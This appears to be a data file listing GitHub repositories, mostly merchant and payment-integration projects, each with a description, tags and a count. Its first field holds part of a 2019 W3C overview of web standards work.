reshaped the whole communication landscape by making any connected device a potential communication end-point, bringing audio and video communications anywhere, on any network, vastly expanding the ability of operators to reach their customers. WebRTC serves as the corner-stone of many online communication and collaboration services.  The WebRTC Working Group aims to bringing WebRTC 1.0 (and companion specification Media Capture and Streams) to Recommendation by the end of 2019. Intense efforts are focused on testing (supported by a dedicated hackathon at IETF 104) and interoperability. The group is considering pushing features that have not gotten enough traction to separate modules or to a later minor revision of the spec.  Beyond WebRTC 1.0, the WebRTC Working Group will focus its efforts on WebRTC NV which the group has started documenting by identifying use cases.  Web & Networks  Recently launched, in the wake of the May 2018 Web5G workshop, the Web & Networks Interest Group is chaired by representatives from AT&T, China Mobile and Intel, with a goal to explore solutions for web applications to achieve better performance and resource allocation, both on the device and network. The group\'s first efforts are around use cases, privacy & security requirements and liaisons.  Automotive   All Automotive specifications  To create a rich application ecosystem for vehicles and other devices allowed to connect to the vehicle, the W3C Automotive Working Group is delivering a service specification to expose all common vehicle signals (engine temperature, fuel/charge level, range, tire pressure, speed, etc.)  The Vehicle Information Service Specification (VISS), which is a Candidate Recommendation, is seeing more implementations across the industry. It provides the access method to a common data model for all the vehicle signals ‚Äìpresently encapsulating a thousand or so different data elements‚Äì and will be growing to accommodate the advances in automotive such as autonomous and driver assist technologies and electrification.  The group is already working on a successor to VISS, leveraging the underlying data model and the VIWI submission from Volkswagen, for a more robust means of accessing vehicle signals information and the same paradigm for other automotive needs including location-based services, media, notifications and caching content.  The Automotive and Web Platform Business Group acts as an incubator for prospective standards work. One of its task forces is using W3C VISS in performing data sampling and off-boarding the information to the cloud. Access to the wealth of information that W3C\'s auto signals standard exposes is of interest to regulators, urban planners, insurance companies, auto manufacturers, fleet managers and owners, service providers and others. In addition to components needed for data sampling and edge computing, capturing user and owner consent, information collection methods and handling of data are in scope.  The upcoming W3C Workshop on Data Models for Transportation (September 2019) is expected to focus on the need of additional ontologies around transportation space.  Web of Things   All Web of Things specifications  W3C\'s Web of Things work is designed to bridge disparate technology stacks to allow devices to work together and achieve scale, thus enabling the potential of the Internet of Things by eliminating fragmentation and fostering interoperability.  Thing descriptions expressed in JSON-LD cover the behavior, interaction affordances, data schema, security configuration, and protocol bindings. The Web of Things complements existing IoT ecosystems to reduce the cost and risk for suppliers and consumers of applications that create value by combining multiple devices and information services. There are many sectors that will benefit, e.g. smart homes, smart cities, smart industry, smart agriculture, smart healthcare and many more.  The Web of Things Working Group is finishing the initial Web of Things standards, with support from the Web of Things Interest Group:  Web of Things Architecture Thing Descriptions Strengthening the Core of the Web HTML   The HTML Working Group was chartered early June to assist the W3C community in raising issues and proposing solutions for the HTML and DOM specifications, and to produce W3C Recommendations from WHATWG Review Drafts.  A few days before, W3C and the WHATWG signed a Memorandum of Understanding outlining the agreement to collaborate on the development of a single version of the HTML and DOM specifications.  Issues and proposed solutions for HTML and DOM done via the newly rechartered HTML Working Group in the WHATWG repositories  The HTML Working Group is targetting November 2019 to bring HTML and DOM to Candidate Recommendations.  CSS  All CSS specifications  CSS is a critical part of the Open Web Platform. The CSS Working Group gathers requirements from two large groups of CSS users: the publishing industry and application developers. Within W3C, those groups are exemplified by the Publishing groups and the Web Platform Working Group. The former requires things like better pagination support and advanced font handling, the latter needs intelligent (and fast!) scrolling and animations.  What we know as CSS is actually a collection of almost a hundred specifications, referred to as ‚Äòmodules‚Äô. The current state of CSS is defined by a snapshot, updated once a year. The group also publishes an index defining every term defined by CSS specifications.  Fonts   All Fonts specifications  The Web Fonts Working Group develops specifications that allow the interoperable deployment of downloadable fonts on the Web, with a focus on Progressive Font Enrichment as well as maintenance of WOFF Recommendations.  Recent and ongoing work includes:  Early API experiments by Adobe and Monotype have demonstrated the feasibility of a font enrichment API, where a server delivers a font with minimal glyph repertoire and the client can query the full repertoire and request additional subsets on-the-fly. In other experiments, the Brotli compression used in WOFF 2 was extended to support shared dictionaries and patch update. Metrics to quantify improvement are a current hot discussion topic. The group will meet at ATypi 2019 in Japan, to gather requirements from the international typography community. The group will first produce a report summarizing the strengths and weaknesses of each prototype solution by Q2 2020. SVG   All SVG specifications  SVG is an important and widely-used part of the Open Web Platform. The SVG Working Group focuses on aligning the SVG 2.0 specification with browser implementations, having split the specification into a currently-implemented 2.0 and a forward-looking 2.1. Current activity is on stabilization, increased integration with the Open Web Platform, and test coverage analysis.  The Working Group was rechartered in March 2019. A new work item concerns native (non-Web-browser) uses of SVG as a non-interactive, vector graphics format.  Audio  The Web Audio Working Group was extended to finish its work on the Web Audio API, expecting to publish it as a Recommendation by year end. The specification enables synthesizing audio in the browser. Audio operations are performed with audio nodes, which are linked together to form a modular audio routing graph. Multiple sources ‚Äî with different types of channel layout ‚Äî are supported. This modular design provides the flexibility to create complex audio functions with dynamic effects.  The first version of Web Audio API is now feature complete and is implemented in all modern browsers. Work has started on the next version, and new features are being incubated in the Audio Community Group.  Performance   Web Performance  All Web Performance specifications  There are currently 18 specifications in development in the Web Performance Working Group aiming to provide methods to observe and improve aspects of application performance of user agent features and APIs. The W3C team is looking at related work incubated in the W3C GPU for the Web (WebGPU) Community Group which is poised to transition to a W3C Working Group. A preliminary draft charter is available.  WebAssembly  All WebAssembly specifications  WebAssembly improves Web performance and power by being a virtual machine and execution environment enabling loaded pages to run native (compiled) code. It is deployed in Firefox, Edge, Safari and Chrome. The specification will soon reach Candidate Recommendation.  WebAssembly enables near-native performance, optimized load time, and perhaps most importantly, a compilation target for existing code bases. While it has a small number of native types, much of the performance increase relative to Javascript derives from its use of consistent typing. WebAssembly leverages decades of optimization for compiled languages and the byte code is optimized for compactness and streaming (the web page starts executing while the rest of the code downloads). Network and API access all occurs through accompanying Javascript libraries -- the security model is identical to that of Javascript.  Requirements gathering and language development occur in the Community Group while the Working Group manages test development, community review and progression of specifications on the Recommendation Track.  Testing  Browser testing plays a critical role in the growth of the Web by:  Improving the reliability of Web technology definitions; Improving the quality of implementations of these technologies by helping vendors to detect bugs in their products; Improving the data available to Web developers on known bugs and deficiencies of Web technologies by publishing results of these tests. Browser Testing and Tools  The Browser Testing and Tools Working Group is developing WebDriver version 2, having published last year the W3C Recommendation of WebDriver. WebDriver acts as a remote control interface that enables introspection and control of user agents, provides a platform- and language-neutral wire protocol as a way for out-of-process programs to remotely instruct the behavior of Web, and emulates the actions of a real person using the browser.  WebPlatform Tests   The WebPlatform Tests project now provides a mechanism which allows to fully automate tests that previously needed to be run manually: TestDriver.  TestDriver enables sending trusted key and mouse events, sending complex series of trusted pointer and key interactions for things like in-content drag-and-drop or pinch zoom, and even file upload.  Since 2014 W3C began work on this coordinated open-source effort to build a cross-browser test suite for the Web Platform, which WHATWG, and all major browsers adopted.  Web of Data   All Data specifications  There have been several great success stories around the standardization of data on the web over the past year.  Verifiable Claims seems to have significant uptake. It is also significant that the Distributed Identifier WG charter has received numerous favorable reviews, and was just recently launched. JSON-LD has been a major success with the large deployment on Web sites via schema.org.  JSON-LD 1.1 completed technical work, about to transition to CR More than 25% of websites today include schema.org data in JSON-LD The Web of Things description is in CR since May, making use of JSON-LD Verifiable Credentials data model is in CR since July, also making use of JSON-LD Continued strong interest in decentralized identifiers Engagement from the TAG with reframing core documents, such as Ethical Web Principles, to include data on the web within their scope Data is increasingly important for all organizations, especially with the rise of IoT and Big Data. W3C has a mature and extensive suite of standards relating to data that were developed over two decades of experience, with plans for further work on making it easier for developers to work with graph data and knowledge graphs.  Linked Data is about the use of URIs as names for things, the ability to dereference these URIs to get further information and to include links to other data. There are ever-increasing sources of open Linked Data on the Web, as well as data services that are restricted to the suppliers and consumers of those services.  The digital transformation of industry is seeking to exploit advanced digital technologies. This will facilitate businesses to integrate horizontally along the supply and value chains, and vertically from the factory floor to the office floor. W3C is seeking to make it easier to support enterprise-wide data management and governance, reflecting the strategic importance of data to modern businesses.  Traditional approaches to data have focused on tabular databases (SQL/RDBMS), Comma Separated Value (CSV) files, and data embedded in PDF documents and spreadsheets. We\'re now in midst of a major shift to graph data with nodes and labeled directed links between them. Graph data is:  Faster than using SQL and associated JOIN operations More favorable to integrating data from heterogeneous sources Better suited to situations where the data model is evolving In the wake of the recent W3C Workshop on Graph Data we are in the process of launching a Graph Standardization Business Group to provide a business perspective with use cases and requirements, to coordinate technical standards work and liaisons with external organizations.  Web for All Security, Privacy, Identity  All Security specifications, all Privacy specifications  Authentication on the Web   As the WebAuthn Level 1 W3C Recommendation published last March is seeing wide implementation and adoption of strong cryptographic authentication, work is proceeding on Level 2.  The open standard Web API gives native authentication technology built into native platforms, browsers, operating systems (including mobile) and hardware, offering protection against hacking, credential theft, phishing attacks, thus aiming to end the era of passwords as a security construct. You may read more in our March press release.  Privacy  An increasing number of W3C specifications are benefitting from Privacy and Security review; there are security and privacy aspects to every specification. Early review is essential. Working with the TAG, the Privacy Interest Group has updated the Self-Review Questionnaire: Security and Privacy.  Other recent work of the group includes public blogging further to the exploration of anti-patterns in standards and permission prompts.  Security  The Web Application Security Working Group adopted Feature Policy, aiming to allow developers to selectively enable, disable, or modify the behavior of some of these browser features and APIs within their application; and Fetch Metadata, aiming to provide servers with enough information to make a priori decisions about whether or not to service a request based on the way it was made, and the context in which it will be used.  The Web Payment Security Interest Group, launched last April, convenes members from W3C, EMVCo, and the FIDO Alliance to discuss cooperative work to enhance the security and interoperability of Web payments (read more about payments).  Internationalization (i18n)   All Internationalization specifications, educational articles related to Internationalization, spec developers checklist  Only a quarter or so current Web users use English online and that proportion will continue to decrease as the Web reaches more and more communities of limited English proficiency. If the Web is to live up to the ""World Wide"" portion of its name, and for the Web to truly work for stakeholders all around the world engaging with content in various languages, it must support the needs of worldwide users as they engage with content in the various languages. The growth of epublishing also brings requirements for new features and improved typography on the Web. It is important to ensure the needs of local communities are captured.  The W3C Internationalization Initiative was set up to increase in-house resources dedicated to accelerating progress in making the World Wide Web ""worldwide"" by gathering user requirements, supporting developers, and education & outreach.  For an overview of current projects see the i18n radar. W3C\'s Internationalization efforts progressed on a number of fronts recently:  Requirements: New African and European language groups will work on the gap analysis, errata and layout requirements. Gap analysis: Japanese, Devanagari, Bengali, Tamil, Lao, Khmer, Javanese, and Ethiopic updated in the gap-analysis documents. Layout requirements document: notable progress tracked in the Southeast Asian Task Force while work continues on Chinese layout requirements. Developer support: Spec reviews: the i18n WG continues active review of specifications of the WHATWG and other W3C Working Groups. Short review checklist: easy way to begin a self-review to help spec developers understand what aspects of their spec are likely to need attention for internationalization, and points them to more detailed checklists for the relevant topics. It also helps those reviewing specs for i18n issues. Strings on the Web: Language and Direction Metadata lays out issues and discusses potential solutions for passing information about language and direction with strings in JSON or other data formats. The document was rewritten for clarity, and expanded. The group is collaborating with the JSON-LD and Web Publishing groups to develop a plan for updating RDF, JSON-LD and related specifications to handle metadata for base direction of text (bidi). User-friendly test format: a new format was developed for Internationalization Test Suite tests, which displays helpful information about how the test works. This particularly useful because those tests are pointed to by educational materials and gap-analysis documents. Web Platform Tests: a large number of tests in the i18n test suite have been ported to the WPT repository, including: css-counter-styles, css-ruby, css-syntax, css-test, css-text-decor, css-writing-modes, and css-pseudo. Education & outreach: (for all educational materials, see the HTML & CSS Authoring Techniques) Web Accessibility   All Accessibility specifications, WAI resources  The Web Accessibility Initiative supports W3C\'s Web for All mission. Recent achievements include:  Education and training: Inaccessibility of CAPTCHA updated to bring our analysis and recommendations up to date with CAPTCHA practice today, concluding two years of extensive work and invaluable input from the public (read more on the W3C Blog Learn why your web content and applications should be accessible. The Education and Outreach Working Group has completed revision and updating of the Business Case for Digital Accessibility. Accessibility guidelines: The Accessibility Guidelines Working Group has continued to update WCAG Techniques and Understanding WCAG 2.1; and published a Candidate Recommendation of Accessibility Conformance Testing Rules Format 1.0 to improve inter-rater reliability when evaluating conformance of web content to WCAG An updated charter is being developed to host work on ""Silver"", the next generation accessibility guidelines (WCAG 2.2) There are accessibility aspects to most specifications. Check your work with the FAST checklist.  Outreach to the world W3C Developer Relations   To foster the excellent feedback loop between Web Standards development and Web developers, and to grow participation from that diverse community, recent W3C Developer Relations activities include:  @w3cdevs tracks the enormous amount of work happening across W3C W3C Track during the Web Conference 2019 in San Francisco Tech videos: W3C published the 2019 Web Games Workshop videos The 16 September 2019 Developer Meetup in Fukuoka, Japan, is open to all and will combine a set of technical demos prepared by W3C groups, and a series of talks on a selected set of W3C technologies and projects W3C is involved with Mozilla, Google, Samsung, Microsoft and Bocoup in the organization of ViewSource 2019 in Amsterdam (read more on the W3C Blog) W3C Training   In partnership with EdX, W3C\'s MOOC training program, W3Cx offers a complete ""Front-End Web Developer"" (FEWD) professional certificate program that consists of a suite of five courses on the foundational languages that power the Web: HTML5, CSS and JavaScript. We count nearly 900K students from all over the world.  Translations  Many Web users rely on translations of documents developed at W3C whose official language is English. W3C is extremely grateful to the continuous efforts of its community in ensuring our various deliverables in general, and in our specifications in particular, are made available in other languages, for free, ensuring their exposure to a much more diverse set of readers.  Last Spring we developed a more robust system, a new listing of translations of W3C specifications and updated the instructions on how to contribute to our translation efforts.  W3C Liaisons   Liaisons and coordination with numerous organizations and Standards Development Organizations (SDOs) is crucial for W3C to:  make sure standards are interoperable coordinate our respective agenda in Internet governance: W3C participates in ICANN, GIPO, IGF, the I* organizations (ICANN, IETF, ISOC, IAB). ensure at the government liaison level that our standards work is officially recognized when important to our membership so that products based on them (often done by our members) are part of procurement orders. W3C has ARO/PAS status with ISO. W3C participates in the EU MSP and Rolling Plan on Standardization ensure the global set of Web and Internet standards form a compatible stack of technologies, at the technical and policy level (patent regime, fragmentation, use in policy making) promote Standards adoption equally by the industry, the public sector, and the public at large Coralie Mercier, Editor, W3C Marketing & Communications $Id: Overview.html,v 1.60 2019/10/15 12:05:52 coralie Exp $ Copyright ¬© 2019 W3C ¬Æ (MIT, ERCIM, Keio, Beihang) Usage policies apply.",,6
0,https://github.com/PrestaShop/advancedeucompliance.git,This module helps merchants in getting compliant with applicable e-commerce law in PrestaShop 1.6.,"obsolete,prestashop-module,prestashop-1-6",5
0,https://github.com/mfauveau/omnipay-nmi.git,NMI (Network Merchants Inc.) driver for the Omnipay PHP payment processing library.,"omnipay,nmi,php,driver,gateways,composer",5
0,https://github.com/RazerMS/Magento_Plugin.git,Razer Merchant Services Magento Shopping Cart Plugin,"molpay-plugin,php,magento-plugin,magento-shopping-cart",5
0,https://github.com/NawabHost/bkash-checkout-for-whmcs.git,Collect payment with bKash Merchant Checkout.,"whmcs,whmcs-payment-gateway,bkash,whmcs-module,payment-gateway",5
0,https://github.com/NarenPamza/Merchant-Guide-to-Galaxy.git,"{""Merchant's Guide to the Galaxy Problem""}",,5
0,https://github.com/hiqdev/php-merchant.git,PHP merchant library,hacktoberfest,5
0,https://github.com/hiqdev/omnipay-yandexmoney.git,Yandex.Money plugin for PHP merchant library,hacktoberfest,5
0,https://github.com/CoinifySoftware/python-sdk.git,A Python wrapper for Coinify merchant API and callbacks,,5
0,https://github.com/anuragphadke19/active_merchant_ebs.git,Active Merchant support for Indian Payment Gateway EBS,,5
0,https://github.com/Moneris/MRC-User-Guide-Canada.git,Merchant Resource Center User Guide - Canada,,5
0,https://github.com/Ecwid/ecwid-app-skeleton-php.git,This project is an application skeleton for a typical app for Ecwid App Market. You can use it to quickly bootstrap your project and create an awesome app for Ecwid merchants,,5
0,https://github.com/globaledgesoft/merchant-cart-aws-iot.git,Merchant Cart demo with AWS IoT integration of Music Festival for Inventory Management,,5
0,https://github.com/gwathlobal/trader-rl.git,A merchant roguelike,,5
0,https://github.com/merchantsedition/merchantsedition.git,"PrestaShop\u202f1.6 created a great framework, thirty bees made it stable, Merchant‚Äôs Edition makes this solution with its rich featureset easily accessible for non-technical merchants. ","e-commerce,ecommerce,prestashop,prestashop-1-6,thirty-bees,merchantsedition",5
0,https://github.com/The-Hive-of-Five/Interstellar-Merchant.git,The primary repository for the Interstellar Merchant game.,,5
0,https://github.com/dre1080/fuel-aktivemerchant.git,A php port of Active Merchant payment project for FuelPHP,,5
0,https://github.com/aldente05/merchant-server-midtrans.git,this is merchant server or backend for midtrans snap payment,,5
0,https://github.com/Arcadier/Profile-Input-Fields.git,:clipboard: Need more information about your merchants or customers on your marketplace site? Add new data fields to their profile pages for them to fill-up.,"plug-in,arcadier,marketplace,data,customisation,customer-data",5
0,https://github.com/clarkduvall/coinbase-snapshot.git,"A snapshot of your Coinbase account: your current Bitcoin balance, net profit, and merchant orders.",,5
0,https://github.com/JorgenVatle/xsolla.git,üíé A Node.js client for working with the Xsolla Merchant API.,,5
0,https://github.com/openminds/activemerchant-ogone.git,Deprecated - This is changed as plugin/gem to activemerchant at http://github.com/DefV/active_merchant_ogone,,5
0,https://github.com/harsh6768/awesome-stripe.git,Project contains scenario of cab riding or any on demand services where we need to transfer the funds or amount to the merchant account,"stripe,stripe-connect,stripe-api,boom,bluebird",5
0,https://github.com/nasa8x/printify-api.git,"{""Printify's REST API allows your application to manage a Printify shop on behalf of a Printify Merchant. Create products, submit orders, and more...""}",,5
0,https://github.com/irbis-labs/ccxt-rs.git,A Rust library for cryptocurrency trading and e-commerce with support for many bitcoin/ether/altcoin exchange markets and merchant APIs.,,5
0,https://github.com/codewithpatelo/aopjs.git,"More than a billion of the rural merchants in the developing world commonly depend on hiring on-demand transportation services to commute people or goods to markets. The process of selecting the optimal fare involves handling decision-making characterised with multiple alternatives and competing criteria. Decision support systems are commonly used to solve these types of problems. However, most widely used systems are based on object-based approaches which lack high-level abstractions needed to effectively model and scale human-machine communication. This paper reviews previous literature on the field and introduces an improved preliminary agent-based decision-support approach to overcome those challenges. As a proof of concept, we developed a two-agent simulation that, given a request from one of the agents, the other one takes a dataset of a stratified sample of 104 Ethiopian commuter criteria preferences taken from the Dukem region and an exemplary dataset of fare alternatives. The assistant agent computes those datasets using widely used HPA and TOPSIS algorithms to weight, score, rank those alternatives. Once we run the simulation, in a matter of milliseconds the assistant agent effectively returns an optimal prescription to the other agent, storing all interactions in a self-contained memory resulting in an architecture that allows developers to program further customisation as interactions scale.","decision-support,multi-agent-systems,agent-based-modeling,agent-oriented-programming,javascript,prescriptive-analytics,mobility,mobility-modeling,ethiopia",5
0,https://github.com/BlockchainLabs/MaxCoin.git,"{""There is a lot of uncertainty about of Bitcoin, so many turn to the altcoin market to diversity their crypto holdings, only to find more uncertainty. CoinMarketCap lists over 500 coins, and there are probably more. In this brief post, I offer Maxcoin‚Äôs qualifications as a worthy investment and trade currency.  Maxcoin has a dedicated, skilled, and cognizant foundation team that understands both the economics and politics of cryptocurrency. Crypto is not just a faster and cheaper payment method and a more secure store of value, it‚Äôs about decentralizing the use of currency by removing it from the establishment‚Äôs monopoly. Cryptocurrency allows you to buy and sell and give and save apart from state and bank run spy grids and theft rings. Because you own your coins which are transacted with high cryptography on a decentralized public blockchain, there are no extortionate fees, bank runs, frozen accounts, bailouts, or financial surveillance. The Maxcoin team understands the importance of using your coins in privacy and with security.  Our team members also have a various skill from their professional backgrounds in system administration, programming, web design, technical writing, project management, quality assurance, market trading, and others. More important is their enthusiastic entrepreneurship and dedication to expanding and enriching the Maxcoin ecosystem. Our team members spend countless unpaid hours of planning and building for Maxcoin. Learn more about our team here.  We believe Maxcoin has basic advantages that distinguish it from other altcoins. Here are a few:  Fundamentals  Stronger encryption (SHA3), faster transactions (1 minute block time), low inflation (16 coins per block) Budding Maxcoin Foundation with a roadmap to self-sustainability A one-of-a-kind Maxcoin Bounty Program that allows you to anonymously and immediately donate MAX and BTC to crowdsource the development of Maxcoin‚Äôs critical infrastructure and ecosystem Markets and Services  Listed on 7 exchanges including Cryptsy, Bittrex, Bittylicious, and BTER with 4 currency pairs Revolutionary Cryptobullion (startjoin.com/maxcoinbullion) that will soon be available from selected bullion dealers. Maxcoin can be spent anywhere Bitcoin is accepted through Coingateway.net Buy over 150 gift cards with Maxcoin (Pock.io) Maxcoin Gambling (Cryptobetfair.com) Integration into multicurrency wallet at Casheer.net, Oct 2015 Community and Exposure  Exposure to over 9,000 followers on twitter, more than Ripple, Darkcoin, NXT and many others with more market cap. Maxcoin Forums (forum.maxcoin.co.uk) and chat (maxchat.info) Other communication channels available at Facebook and Bitcointalk This list of distinguishing characteristics doesn‚Äôt change the market price overnight. Like many coins, Maxcoin has seen its share of malicious miners, speculative day traders,  and committed internet trolls. These people are either jealous of the above points or simply foolish and enjoy throwing away treasure. Yes, we are biased, but we genuinely think that Maxcoin is a bargain wonder coin. On the markets, it is at historic lows. But objectively, given its present facts and future goals, Maxcoin is at historic highs. | WHY MAXCOIN MAXCOIN IS MONEY WITHOUT BANKS. USING MAXCOIN, YOU CAN INSTANTLY, SECURELY AND FOR FREE SEND AND RECEIVE PAYMENTS TO FRIENDS, FAMILY AND MERCHANTS WORLDWIDE. A NEW APPROACH TO INNOVATION  MaxCoin is one of the most secure crypto currencies, both because it's based on next generation encryption, SHA3, but also because it's 'open source'. MaxCoin's software is open to inspection and improvement by the best security minds on the planet so that it's mathematically secure. If you don't like paying bank charges, if you don't like the way money is created by banks at no cost to them, and then loaned out to us with interest, then MaxCoin is paving the way to a new money. Open, transparent, and free of charge. Learn more...     ‚Ä¢ Algorithm: Keccak (SHA-3) ‚Ä¢ Generation: 100 million MAX ‚Ä¢ Block time: 1 minute ‚Ä¢ Block Rewards: 16 coins per block ‚Ä¢ Halving every ~4 years ‚Ä¢ Premine: Zero ‚Äì not premined ‚Ä¢ Fees: Zero ‚Äì no transaction fees ‚Ä¢ Difficulty: Retargets every block ""}",,5
0,https://github.com/sudarshan89/merchant-galaxy.git,Merchant guide to galaxy,,4
0,https://github.com/Karbovanets/karbo-woocommerce.git,Karbo for WooCommerce is a Wordpress plugin that allows merchants to accept KRB at WooCommerce-powered online stores.,,4
0,https://github.com/PhonePe/phonepe-php.git,PhonePe PHP Merchant Client Library,,4
0,https://github.com/actionm/laravel-webmoney-merchant.git,Laravel payment processor package for WebMoney Merchant,"laravel-webmoney,laravel-merchant,laravel-payments,accept-payments,webmoney-merchant,webmoney,laravel-5-package",4
0,https://github.com/getsafepay/safepay-woocommerce-plugin.git,Wordpress & Woocommerce plugin to enable Safepay Checkout for merchants,,4
0,https://github.com/PrestaShop/ps_themecusto.git,This module guides the merchant on customizing the look of their shop,"prestashop,prestashop-module,native-module,hacktoberfest",4
0,https://github.com/mattbaird/restful_active_merchant.git,"RESTful, JSON wrapper around active_merchant",,4
0,https://github.com/jswebdevel/btcbox.git,A very simple Bitcoin merchant solution. ,,4
0,https://github.com/RazerMS/Prestashop_Plugin.git,Razer Merchant Services Prestashop Shopping Cart Plugin,,4
0,https://github.com/men232/node-unitpay.git,Unitpay merchant,,4
0,https://github.com/ing-bank/ing-ideal-connectors-php.git,Opensource tools and API to connect webshops and merchants to ING using iDeal,,4
0,https://github.com/gaiazov/Elavon.Net.git,.Net wrapper for Elavon Virtual Merchant,,4
0,https://github.com/Seniru/merchant.git,The repository of the transformice module merchant,"transformice,game,lua,module,transformice-module",4
0,https://github.com/estuans/django-oscar-gmerchant.git,Integration with Google Merchant Center and Django Oscar,,4
0,https://github.com/RiceKaggle/EloMerchantKaggle.git,This is a repository for elo merchant kaggle competition.,"kaggle,python,machine-learning,feature-engineering,lightgbm,catboost,decision-tree",4
0,https://github.com/shenoudab/active_merchant_migs.git,MasterCard Internet Gateway Service (MIGS) Gateway support for Active Merchant,,4
0,https://github.com/Alchemy-GPS/cryptocurrency-cashier-android.git,Android cryptocurrency cashier APP for merchants,,4
0,https://github.com/subchannel13/MerchantRPG-combinator.git,Merchant RPG tool for finding best equipment build.,,4
0,https://github.com/sjkingo/django-commweb.git,A Django module for interfacing with the CommWeb merchant gateway,"python,python-2-7,python-3,django,django-application,commweb,cartridge",4
0,https://github.com/button/button-merchant-android.git,An open source client library for Button merchants.,,4
0,https://github.com/yabacon/paystack-recurrent-billing-wordpress.git,Paystack Recurrent Billing allows you to accept online instalmental and recurrent payments from local and international customers. Allows merchants include a Paystack Inline popup that allows subscription to a plan created on their dashboard via shortcode on their website. The subscription is active until an optional target is paid or the user/merchant cancels the subscription.,,4
0,https://github.com/scala-network/ScalaPay-Merchant-NPM.git,ScalaPay Merchant Endpoint NPM Module,"crypto,scalapay,nodejs,npm",4
0,https://github.com/opengento/magento2-document.git,This module aims to help merchants to manage easily their documents in Magento 2.,"php,magento2,magento,magento2-module,magento2-extension,magento-extension,magento-module,magento-2,magento2-extension-free,document-management",4
0,https://github.com/Matt75/fixconfigurationlang.git,A PrestaShop module for help merchants to adds missing configuration multi language keys,,4
0,https://github.com/TSYS-Merchant/shopping-cart-integrations.git,"{""Plugins that integrate Merchant Warehouse's payment processing solution into various online shopping carts""}",,4
0,https://github.com/wrhansen/eBay-LMS-API.git,"{""Python api to create and upload a BulkDataExchange request to eBay's Large Merchant Services ""}",,4
0,https://github.com/mivaecommerce/api-sdk-php.git,Miva Merchant JSON API SDK for PHP,"miva,miva-api,api-wrapper,sdk",4
0,https://github.com/joebluems/BreachDetection.git,Using Apache Drill to calculate log-likelihood Breach Score for Merchants to find source of compromised accounts,,4
0,https://github.com/Arcadier/Recommended-Retail-Price-Fields.git,Show your consumers how much they‚Äôre saving - let merchants display both the original and discounted prices of their items,"plug-in,arcadier,marketplace,customisation,pricing",4
0,https://github.com/SirFrancisDrake/Babylon-5--We-ve-Lost-Her.git,"{""a `Sea Legends'-like roaming-merchant game written in Haskell""}",,4
0,https://github.com/oqasem1/EzyCards.git,"{""Facebook-Store-StopShop ShopOnline EzyGate allow merchants who don't have online store to start selling and showing their products on their facebook pages simply and quickly""}",,4
0,https://github.com/noudadrichem/dynamic-feed-validator.git,üîçüë®üèª\u200düíªÔ∏èValidates Google Merchant product feeds by streaming XML RSS feeds via Java and push notifications to an Angular front-end via WebSockets.,"java,typescript,angular,jersey,postgresql,docker-compose",4
0,https://github.com/Mondido/mondido-js.git,The JavaScript payment form that enable merchant to do client side encrypted payments.,,4
0,https://github.com/ChinaepayUSACorporation/Merchant_Scan_User_Biz_Docs.git,"{""This is the biz documents of some merchant to scan subscriber's Wechang QR Code.""}",,4
0,https://github.com/ChinaepayUSACorporation/User_Scan_Merchant_Biz_Docs.git,"{""It's thd biz documents for user to scan merchant's QR code.""}",,4
0,https://github.com/ryanzhou/CoinJar.git,NPM (node.js) library for CoinJar (https://coinjar.io) Bitcoin merchant and account API,,4
0,https://github.com/sirdeggen/openBaemail.git,"Baemail Protocol, send from anywhere. Requires merchant registration for just now.",,4
0,https://github.com/customify/customify-cli.git,A software based tool for merchant to maintain relationship with their clients. ,"java,tcp,mysql",4
0,https://github.com/pavlenex/Bitcoin-Payments.git,Designing a set of guidelines for those interested in building Bitcoin merchant applications üèóÔ∏è,"bitcoin,bitcoin-payments,bitcoin-merchant",4
0,https://github.com/ryaan-anthony/magento-members-only.git,Members-only extension for Magento 1.x. allows merchants to hide prices from the public and require admin approval for new user registrations. Logged in members have full access. Can be configured per website. ,,4
0,https://github.com/kancart/osCommerce-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for osCommerce (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,4
0,https://github.com/jakemedal/OSRSFlippingTool.git,[Deprecated --> osrs-flipping-tool-webapp] A tool which scans the Oldschool Runescape marketplace for optimal merchanting items.,,4
0,https://github.com/SamClayton/GalaxyTraders.git,"A space merchant game written in Meteor, based on a lineage of games dating back to the 1970s PC game Star Traders",,4
0,https://github.com/GG4mida/tronpay-document.git,"ÊúÄ‰Ω≥ USDT.TRC20 ËΩ¨Ë¥¶Êé•Âè£ÊúçÂä°ÔºåÁ®≥ÂÆöÂÆâÂÖ®ÔºåÁßíÁ∫ßÂà∞Ë¥¶„ÄÇTether Wallet API, Crypto Payment API, Crypto Merchant Account, Crypto Payment Gateway, Tether TRC20, TRC20 Payment API, TRC20 Wallet API, TRON Payment API, TRON Wallet API, USDT Payment API, USDT Wallet API, TRON Tether API, TRON API, TRC20 API","usdtapi,usdtpay,tronpay,tronapi,trc20api,trc20pay,trc20,tronwallet,trc20wallet,tron-api,trc20-pay,trc20-api,usdt-api,usdt-pay",4
0,https://github.com/inspire/amember.git,"{""This is a plugin for using amember with inspire gateway's merchant vault.  The plugin allows for deployment of a PCI level 1 compliant amember instance in terms of card storage and encyption requirements.""}",,4
0,https://github.com/pweightman/apw_php_magento_google_data_feed.git,"Google Merchant Data Feed for Magento written in PHP using DOM Document XML, this script is provided as is, and will need modification prior to use, it has been published purely as an example and is not for commercial use.",,4
0,https://github.com/rakshitshah94/paypal-sandbox-java-hibernate-integration-demo.git,"Paypal payment module using Hibernate java. You need to make two accounts on paypal SANDBOX [one is for merchant and other is for customer, link is given below for testing].","paypal-sandbox,paypal-payments,integrating-paypal,paypal,api",4
0,https://github.com/PrestaShop/welcome.git,"{""This module helps merchants create their first product and discover their new shop's main features.""}","prestashop-module,native-module,prestashop",3
0,https://github.com/gzcocoa/easypay.git,"A web payment system. Merchants can use it as a cashier, and consumers can pay money to merchants by it.",,3
0,https://github.com/vippsas/vipps-signup-api.git,Vipps Signup API (for partners to sign up merchants),vipps,3
0,https://github.com/ChumakovAnton/yii2-tinkoff-pay.git,Extension for oplata.tinkoff.ru merchant API,,3
0,https://github.com/oxipay/oxidocs.git,Oxipay documentation for merchants and custom integrators,,3
0,https://github.com/diem/reference-merchant.git,A demonstration merchant solution.,,3
0,https://github.com/geopayme/BTCMerchant.git,A BTC Merchant POS app for Android,,3
0,https://github.com/ing-bank/ing-ideal-connectors-net.git,Opensource tools and API to connect webshops and merchants to ING using iDeal,,3
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-Java.git,Sample Java client for communicating with SpectroCoin Bitcoin Merchant API,,3
0,https://github.com/bitbill/merchantApi.git,Api for Ownbit Merchant Wallet,,3
